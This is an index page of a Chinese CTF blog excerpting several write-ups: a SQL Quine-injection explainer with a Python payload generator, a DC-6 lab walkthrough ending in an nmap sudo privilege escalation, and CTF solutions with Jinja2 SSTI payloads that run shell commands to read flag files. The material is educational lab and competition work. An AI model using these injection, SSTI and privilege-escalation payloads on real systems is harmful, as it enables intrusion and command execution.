            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #ffa2c4">后端</a>
        </span>
        
    </div>
    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">
        <h2 class="post-title">sql注入 Quine注入解析</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>quine注入,即查询的结果是查询的语句</p>
<p>首先看看如下sql语句会返回什么</p>
<pre><code class="sql">select replace(&quot;.&quot;,char(46),&quot;.&quot;);
</code></pre>
<p>返回了一个点</p>
<p>匹配字符串”.”中ascii码为46的字符并替换为”.”,也就是将”.”转换为”.”并返回</p>
<p>继续看下面这个sql语句</p>
<pre><code class="sql">select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;);
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/ddd986e7bc6d49d995755fb301370584.png" alt="在这里插入图片描述">很相似,但并不完全一致,查询出的结果是双引号的</p>
<p>此处将字符串    <strong>replace(“.”,char(46),”.”)</strong></p>
<p>中ascii码为46的字符替换为另一字符串 <strong>replace(“.”,char(46),”.”)</strong></p>
<p>也就是</p>
<p><strong>replace(“replace(“.”,char(46),”.”)”,char(46),”replace(“.”,char(46),”.”)”)</strong></p>
<p>观察原来的查询语句</p>
<p><strong>replace(‘ replace(“.”,char(46),”.”)’,char(46),’replace(“.”,char(46),”.”)’)</strong></p>
<p>那么我们只需要将双引号替换成单引号就行</p>
<pre><code class="sql">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));
</code></pre>
<p>所以需要替换的字符串就变成了</p>
<pre><code class="sql">&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;
</code></pre>
<p>这一步是替换单双引号</p>
<pre><code class="sql">select replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39));
</code></pre>
<p>这一步是替换点为相关字符</p>
<pre><code class="sql">select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
</code></pre>
<p>最终得到如上结果</p>
<p>这样我们确实是可以执行sql语句了,但是还需要解决注入的问题(这样只能堆叠)<br>所以加入union select的sql语句如下</p>
<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
</code></pre>
<h1 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h1><p>构造过程如下<br>第一步拿基本语句作为替换语句<br>比如我想要 1’union select #</p>
<pre><code class="sql">1&quot;union select #
</code></pre>
<p>转单引号为双引号</p>
<pre><code class="sql">1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#
</code></pre>
<p>放入基本语句</p>
<p>第二步拼接</p>
<pre><code class="sql">replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)
</code></pre>
<pre><code class="sql">replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)
</code></pre>
<p>补全</p>
<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
</code></pre>
<h1 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h1><p>适用于如下的条件<br><img src="https://img-blog.csdnimg.cn/img_convert/8af6284c4c69e50af99460d0e3239738.png" alt="image-20230424135507408"><img src="https://img-blog.csdnimg.cn/img_convert/b0d43f37612ab511373ebcf8ca00f301.png" alt="image-20230424135535557"></p>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="python">sql = input (&quot;输入你的sql语句,不用写关键查询的信息  形如 1&#39;union select #\n&quot;)
sql2 = sql.replace(&quot;&#39;&quot;,&#39;&quot;&#39;)
base = &quot;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&quot;
final = &quot;&quot;
def add(string):
    if (&quot;--+&quot; in string):
        tem = string.split(&quot;--+&quot;)[0] + base + &quot;--+&quot;
    if (&quot;#&quot; in string):
        tem = string.split(&quot;#&quot;)[0] + base + &quot;#&quot;
    return tem
def patch(string,sql):
    if (&quot;--+&quot; in string):
        return sql.split(&quot;--+&quot;)[0] + string + &quot;--+&quot;
    if (&quot;#&quot; in string):
        return sql.split(&quot;#&quot;)[0] + string + &quot;#&quot;

res = patch(base.replace(&quot;.&quot;,add(sql2)),sql).replace(&quot; &quot;,&quot;/**/&quot;).replace(&quot;&#39;.&#39;&quot;,&#39;&quot;.&quot;&#39;)

print(res)
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #ffa2c4">数据库</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/sql/" style="color: #00bcd4">sql</a>
        </span>
        
    </div>
    <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-6靶机通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/21
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/28790b49d34a4f6a9dbfb3c459016658.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e498790d905f451b9ef93877cc7d3a05.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>发现无法访问web<br>加个hosts<br><img src="https://img-blog.csdnimg.cn/75398b9fcbd64e47bdbab59e3637f972.png" alt="在这里插入图片描述"><br>这题类似那个dc2还是dc3,网站长的一样<br><img src="https://img-blog.csdnimg.cn/59cd4b9ce9f746a8b158c0f6f9559c16.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/c5894d31c6ee48c380e856fcb187ed97.png" alt="在这里插入图片描述"><br>wordPress5.1.1<br>上wpscan扫<br>enumrate一下user 看看能不能弱口令<br>测了wp给的那几个用户,都不能弱口令,dirsearch也没扫到什么有价值的路径<br>尝试ssh弱口令<br>没爆出来,回官网看了下描述<br><img src="https://img-blog.csdnimg.cn/5f2193d7f0fa408dbe4e7e1b6a6080e5.png" alt="在这里插入图片描述"><br>确实是弱口令,但是我的字典差着了,给了提示就用吧<br><img src="https://img-blog.csdnimg.cn/f164d3474e204bf5af16ed2ae7992e7d.png" alt="在这里插入图片描述"><br>账号mark 密码 helpdesk01<br>登录后台<br><img src="https://img-blog.csdnimg.cn/2297c026c7de49e390cea88fa1f3ece0.png" alt="在这里插入图片描述"><br>尝试使用相关插件漏洞<br><img src="https://img-blog.csdnimg.cn/f1e17535c6ab4667864691bfa8df275e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/be2c598f6e5344888e2875d9ca6c2774.png" alt="在这里插入图片描述"><br>发包,然后拿到反弹的shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/fbc678aa07754f649e1bbd466a7fce1e.png" alt="在这里插入图片描述"><br>用LinEnum.sh遍历脆弱性<br>没发现什么可以利用的<br>回去翻home目录ls -al看看文件<br>发现jens用户下有一个backup.sh<br><img src="https://img-blog.csdnimg.cn/c83c00e12a9844efb78be073bb7667ad.png" alt="在这里插入图片描述"><br>然而我们不是devs组的,没法写这个文件<br>继续看<br><img src="https://img-blog.csdnimg.cn/092758c8d43042488b6fc5547586110c.png" alt="在这里插入图片描述"><br>发现mark下有个stuff文件夹<br>其内存在一个txt文件<br>里面暴露了graham的账号<br>尝试ssh登录<img src="https://img-blog.csdnimg.cn/51924e6673a2464d84fabc90f405d254.png" alt="在这里插入图片描述"></p>
<p>登录上发现graham是该组的<br>sudo -l看看有什么可用的<br><img src="https://img-blog.csdnimg.cn/0b4821478d57468bba33942bf1cd8e8f.png" alt="在这里插入图片描述"></p>
<p>发现我们可以以jens的身份去运行backups.sh文件,且我们可以写这个sh文件,那么我们就可以拿一个jens用户的shell了<br><img src="https://img-blog.csdnimg.cn/1a26bb17bc0a4abeab0fefca202a1832.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b21a30ba7ed84aed91f3b86d47ce1261.png" alt="在这里插入图片描述"><br>可以尝试nmap提权<br><code>TF=$(mktemp) echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; $TF sudo nmap --script=$TF </code><br>这时候其实就拿到root权限的用户了,但是是看不见自己打了什么命令的,盲打一个优化shell<br><img src="https://img-blog.csdnimg.cn/6590c3a7571e41009eb640f10ea6c048.png" alt="在这里插入图片描述"><br>结束</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #00bcd4">运维</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/ssh/" style="color: #ffa2c4">ssh</a>
        </span>
        
    </div>
    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">2023 GDOUCTF 部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/16
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>js改个高分然后去送<img src="https://img-blog.csdnimg.cn/4f549bced35444c2b171ef7068ca3c78.png" alt="在这里插入图片描述"></p>
<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/5bdcf86c3ab2457aa2ce4a2709a071a7.png" alt="在这里插入图片描述"></p>
<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>看源码然后发put包<br><img src="https://img-blog.csdnimg.cn/a6ebfe910bf74701bfa85a18624d983a.png" alt="在这里插入图片描述"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h2><p>过滤挺多的 . _ 然后各种关键字<br>点用|attr()绕   下划线用拼接<br><img src="https://img-blog.csdnimg.cn/7175d0010532459e89192baf12aa5cec.png" alt="在这里插入图片描述"><br>payload如下<br><code>name=&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;&#123;% set bs=(a,a,dict(bas=a,e=b)|join(),a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;&#123;%set pp=dict(pop=a,en=b)|join %&#125;&#123;%set r=self|string|attr(geti)(18)%&#125;&#123;%set rd=dict(read=a)|join%&#125;&#123;%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)('cat /flag')|attr('read')() )%&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><pre><code class="python">cipher = &#39;+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#39;
encryptedString = &quot;&quot;
decryptedString = &#39;&#39;
for char in cipher:
    if char == &#39;!&#39;:
        decryptedString += &#39;a&#39;
    elif char == &#39;1&#39;:
        decryptedString += &#39;b&#39;
    elif char == &#39;)&#39;:
        decryptedString += &#39;c&#39;
    elif char == &#39;v&#39;:
        decryptedString += &#39;d&#39;
    elif char == &#39;m&#39;:
        decryptedString += &#39;e&#39;
    elif char == &#39;+&#39;:
        decryptedString += &#39;f&#39;
    elif char == &#39;q&#39;:
        decryptedString += &#39;g&#39;
    elif char == &#39;0&#39;:
        decryptedString += &#39;h&#39;
    elif char == &#39;c&#39;:
        decryptedString += &#39;i&#39;
    elif char == &#39;]&#39;:
        decryptedString += &#39;j&#39;
    elif char == &#39;(&#39;:
        decryptedString += &#39;k&#39;
    elif char == &#39;&#125;&#39;:
        decryptedString += &#39;l&#39;
    elif char == &#39;[&#39;:
        decryptedString += &#39;m&#39;
    elif char == &#39;8&#39;:
        decryptedString += &#39;n&#39;
    elif char == &#39;5&#39;:
        decryptedString += &#39;o&#39;
    elif char == &#39;$&#39;:
        decryptedString += &#39;p&#39;
    elif char == &#39;*&#39;:
        decryptedString += &#39;q&#39;
    elif char == &#39;i&#39;:
        decryptedString += &#39;r&#39;
    elif char == &#39;&gt;&#39;:
        decryptedString += &#39;s&#39;
    elif char == &#39;#&#39;:
        decryptedString += &#39;t&#39;
    elif char == &#39;&lt;&#39;:
        decryptedString += &#39;u&#39;
    elif char == &#39;?&#39;:
        decryptedString += &#39;v&#39;
    elif char == &#39;o&#39;:
        decryptedString += &#39;w&#39;
    elif char == &#39;^&#39;:
        decryptedString += &#39;x&#39;
    elif char == &#39;-&#39;:
        decryptedString += &#39;y&#39;
    elif char == &#39;_&#39;:
        decryptedString += &#39;z&#39;
    elif char == &#39;h&#39;:
        decryptedString += &#39;0&#39;
    elif char == &#39;w&#39;:
        decryptedString += &#39;1&#39;
    elif char == &#39;e&#39;:
        decryptedString += &#39;2&#39;
    elif char == &#39;9&#39;:
        decryptedString += &#39;3&#39;
    elif char == &#39;g&#39;:
        decryptedString += &#39;4&#39;
    elif char == &#39;z&#39;:
        decryptedString += &#39;5&#39;
    elif char == &#39;d&#39;:
        decryptedString += &#39;6&#39;
    elif char == &#39;~&#39;:
        decryptedString += &#39;7&#39;
    elif char == &#39;=&#39;:
        decryptedString += &#39;8&#39;
    elif char == &#39;x&#39;:
        decryptedString += &#39;9&#39;
    elif char == &#39;j&#39;:
        decryptedString += &#39;!&#39;
    elif char == &#39;:&#39;:
        decryptedString += &#39;@&#39;
    elif char == &#39;4&#39;:
        decryptedString += &#39;#&#39;
    elif char == &#39;b&#39;:
        decryptedString += &#39;$&#39;
    elif char == &#39;`&#39;:
        decryptedString += &#39;%&#39;
    elif char == &#39;l&#39;:
        decryptedString += &#39;^&#39;
    elif char == &#39;3&#39;:
        decryptedString += &#39;&amp;&#39;
    elif char == &#39;t&#39;:
        decryptedString += &#39;*&#39;
    elif char == &#39;6&#39;:
        decryptedString += &#39;(&#39;
    elif char == &#39;s&#39;:
        decryptedString += &#39;)&#39;
    elif char == &#39;n&#39;:
        decryptedString += &#39;_&#39;
    elif char == &#39;;&#39;:
        decryptedString += &#39;+&#39;
    elif char == &#39;\&#39;&#39;:
        decryptedString += &#39;-&#39;
    elif char == &#39;r&#39;:
        decryptedString += &#39;=&#39;
    elif char == &#39;k&#39;:
        decryptedString += &#39;`&#39;
    elif char == &#39;p&#39;:
        decryptedString += &#39;~&#39;
    elif char == &#39;\&quot;&#39;:
        decryptedString += &#39;&#123;&#39;
    elif char == &#39;&amp;&#39;:
        decryptedString += &#39;&#125;&#39;
    elif char == &#39;/&#39;:
        decryptedString += &#39;[&#39;
    elif char == &#39;\\&#39;:
        decryptedString += &#39;]&#39;
    elif char == &#39;2&#39;:
        decryptedString +=  &#39;|&#39;
    elif char == &#39;.&#39;:
        decryptedString += &#39;:&#39;
    elif char == &#39;%&#39;:
        decryptedString += &#39;;&#39;
    elif char == &#39;|&#39;:
        decryptedString += &#39;&quot;&#39;
    elif char == &#39;,&#39;:
        decryptedString += &quot;&#39;&quot;
    elif char == &#39;@&#39;:
        decryptedString += &#39;&lt;&#39;
    elif char == &#39;&#123;&#39;:
        decryptedString += &#39;&gt;&#39;
    elif char == &#39;u&#39;:
        decryptedString += &#39;,&#39;
    elif char == &#39;7&#39;:
        decryptedString += &#39;.&#39;
    elif char == &#39;y&#39;:
        decryptedString += &#39;?&#39;
    elif char == &#39;a&#39;:
        decryptedString += &#39;/&#39;

    print(decryptedString)
</code></pre>
<h2 id="babylua"><a href="#babylua" class="headerlink" title="babylua"></a>babylua</h2><p>先爆破得到key<br>有key就可以直接解密了</p>
<pre><code class="python">import hashlib
import string
cipher = [&#39;200&#39;, &#39;161&#39;, &#39;198&#39;, &#39;157&#39;, &#39;173&#39;, &#39;169&#39;, &#39;199&#39;, &#39;150&#39;, &#39;105&#39;, &#39;163&#39;, &#39;193&#39;, &#39;175&#39;, &#39;173&#39;, &#39;194&#39;, &#39;135&#39;, &#39;131&#39;, &#39;135&#39;, &#39;225&#39;]
flag = &#39;&#39;

# key10 = &#39;b5e62abe84&#39;
# string = string.ascii_letters
# for i in string:
#     for j in string:
#         for k in string:
#             for l in string:
#                 seed = i+j+k+l
#                 key = hashlib.md5(seed.encode()).hexdigest()
#                 key = hashlib.md5(key.encode()).hexdigest()
#                 if(key[:10] == key10):
#                     print(key)

# b5e62abe84bc8afbfd97c91a15aa0867

key = &#39;b5e62abe84bc8afbfd97c91a15aa0867&#39;
for i in range(len(cipher)):
    flag += chr(int(cipher[i])-ord(key[i])) 
print(flag)
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
    </div>
    <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/02/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF2023%20%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">CTFSHOW愚人杯2023 部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/2
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>url是base64编码后的文件名<br>直接读个index.php<br>然后查看源码 解码base64</p>
<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>过滤了斜杠,不能访问根目录了,考虑手动拼接一个<code>&#123;&#123;lipsum.__globals__.os.popen(lipsum.__globals__.__str__().__getitem__(34)~lipsum.__globals__.__str__().__getitem__(5)~lipsum.__globals__.__str__().__getitem__(22)~lipsum.__globals__.__str__().__getitem__(139)~lipsum.__globals__.__str__().__getitem__(288)~lipsum.__globals__.__str__().__getitem__(87)~lipsum.__globals__.__str__().__getitem__(24)~lipsum.__globals__.__str__().__getitem__(5)~lipsum.__globals__.__str__().__getitem__(54)).read()&#125;&#125;</code></p>
<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>session伪造<br>伪造成admin登录后可以任意文件下载<br>下个app.py看源码<br><img src="https://img-blog.csdnimg.cn/27056cbdb97f4210938891d4598a2391.png" alt="在这里插入图片描述"><br>hello路由下存在ssti<br>可以tplmap一把梭<br>手动挡payload如下<br><code>request.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat /*&quot;).read()&#39;)</code></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="easy-pyc"><a href="#easy-pyc" class="headerlink" title="easy_pyc"></a>easy_pyc</h2><p>反编译得到py源码</p>
<pre><code class="bash">uncompyle6 -o a.py  xxx.pyc
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/1215d68442904abf9363308072d5f3c3.png" alt="在这里插入图片描述"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>签到 解码base64即可</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>09改00然后bandzip修复<br><img src="https://img-blog.csdnimg.cn/2e79b84f20ab44e0a70adf19822a66ab.png" alt="在这里插入图片描述"><br>crc爆破宽高<br><img src="https://img-blog.csdnimg.cn/e2a0bd20912641338742680c0ff7dc03.png" alt="在这里插入图片描述"><br>修改高度为300<br>Ocr识别得到<br>5oSa5Lq66lqC5b+r5LmQ77yB77yB77yB解base64可以得到类似愚人节快乐的字符串<br>没什么用<br>Binwalk抽下图<br>发现里面还有一个压缩包<br>010打开</p>
<p><img src="https://img-blog.csdnimg.cn/7de6f026102a47139a8d61d58d44df2c.png" alt="在这里插入图片描述"><br>在最后发现key的base64编码后的值,解码得到yurenjie<br>解压得到图片<br>crc 完了ocr<br><img src="https://img-blog.csdnimg.cn/ee8fc6602dea47be99d7858ac328f0bc.png" alt="在这里插入图片描述"></p>
<h2 id="琴柳感"><a href="#琴柳感" class="headerlink" title="琴柳感"></a>琴柳感</h2><p><img src="https://img-blog.csdnimg.cn/62c27d36fd3d41de951b989b8c9c6045.png" alt="在这里插入图片描述"><br>观察发现除去开头和结尾独立的两句话 一共来回四句话<br>猜测四进制<br>四位一组要想能解出字母第一位必是1 因为4^3 &#x3D;64<br>那么所有的<code>你有没有感受到城市在分崩离析？</code>替换为1,另外三局遍历替换<br>最终得到的四进制的字符串</p>
<pre><code class="bash">120313101212130312201233131313231320122112321213120213111203121112321213132012211232121311331321122112021311132212011221132112211133132212011221122312111230122112011232132112211230122112011232120212011331
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/49ebbc33ab614e36a0953f9c3c36f343.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/python/" style="color: #ffa2c4">python</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00a596">php</a>
        </span>
        
    </div>
    <a href="/2023/04/02/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF2023%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <a class="page-num" href="/page/5/">
        <i class="fa-solid fa-caret-left fa-fw"></i>
    </a>
    <a class="page-num" href="/">1</a>
    <span class="page-omit">...</span>
    
    <span class="current">6</span>
    
    <a class="page-num" href="/page/7">7</a>
    
    
    
    
    <a class="page-num" href="/page/7/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/Arcueid.jpg" alt="avatar" />
        </div>
        <div class="name">Arcueid</div>
        <div class="description">
            <p>Web + Crypto 苦手</p>

        </div>
        
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
